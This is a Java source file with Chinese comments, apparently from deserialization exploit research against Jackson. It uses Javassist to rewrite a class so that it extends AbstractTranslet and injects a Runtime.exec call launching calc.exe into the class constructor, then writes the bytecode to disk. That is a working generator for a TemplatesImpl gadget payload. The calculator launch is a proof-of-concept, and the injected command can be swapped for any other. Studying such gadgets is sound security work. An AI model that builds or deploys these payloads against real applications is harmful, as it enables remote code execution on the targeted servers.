package com.example.demo.model;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;


public class GeneratePayload {

    public static void main(String[] args) throws NotFoundException, CannotCompileException {
        // 创建ClassPool对象
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));

        // 导包(告诉 Java编译器 去寻找对应的包,不是直接写入到 class 文件中)
//        classPool.importPackage("com.sun.org.apache.xalan.internal.xsltc.runtime.*");

        // 获取已存在的类进行修改(发现会自主生成一个无参的构造方法)
//        CtClass ctClass = classPool.get("com.example.demo.model.Target");
        // 另一种写法
//        CtClass ctClass = classPool.get(com.example.demo.model.Target.class.getName());
        // 另一种写法
        CtClass ctClass = classPool.get(Target.class.getName());

        try {
            // 使当前类实现指定接口 ctClass.setInterfaces();
//            CtClass codeClassI = classPool.get("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
//            ctClass.setInterfaces(new CtClass[]{codeClassI});

            // 指定当前类的父类
//            CtClass superclass = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            // 另一种写法
            CtClass superclass = classPool.get(AbstractTranslet.class.getName());
            ctClass.setSuperclass(superclass);

            // 创建私有变量: private Object param;
//            CtField ctField = CtField.make("private Object param;", ctClass);
//            ctClass.addField(ctField);

//            // 创建类成员变量 content
//            CtField ctField = CtField.make("private static String content1 = \"Hello world1111~\";", ctClass);
//            // 将成员变量添加到ctClass对象中
//            ctClass.addField(ctField);

//            // 创建一个主方法并输出content对象值
//            CtMethod ctMethod1 = CtMethod.make(
//                    "public static void main(String[] args) {System.out.println(content1);}", ctClass
//            );
//            // 将成员方法添加到ctClass对象中
//            ctClass.addMethod(ctMethod1);

            String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
            // 创建静态代码块
//            ctClass.makeClassInitializer().insertBefore(cmd);

            // 修改原本的无参构造函数
            CtConstructor declaredConstructor = ctClass.getDeclaredConstructor(new CtClass[]{});
            declaredConstructor.insertBeforeBody(cmd);

//            // 移除(默认添加的)构造方法
//            CtConstructor ctConstructor = ctClass.getDeclaredConstructors()[0];
//            ctClass.removeConstructor(ctConstructor);

//            // 移除方法
//            CtMethod ctm = ctClass.getDeclaredMethod("Target");
//            ctClass.removeMethod(ctm);

            // 写文件
//            File classFilePath = new File(new File(System.getProperty("user.dir"), "Jackson\\src\\test\\java\\com\\b1ngz\\sec\\model"), "111.class");
////             使用类CtClass，生成字节码
//            byte[] bytes = ctClass.toBytecode();
////             将class二进制内容写入到类文件
//            FileUtils.writeByteArrayToFile(classFilePath, bytes);

            // 等效于
            ctClass.writeFile("D:\\JavaProject\\Jackson\\src\\test\\java");//将生成的.class文件保存到磁盘
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
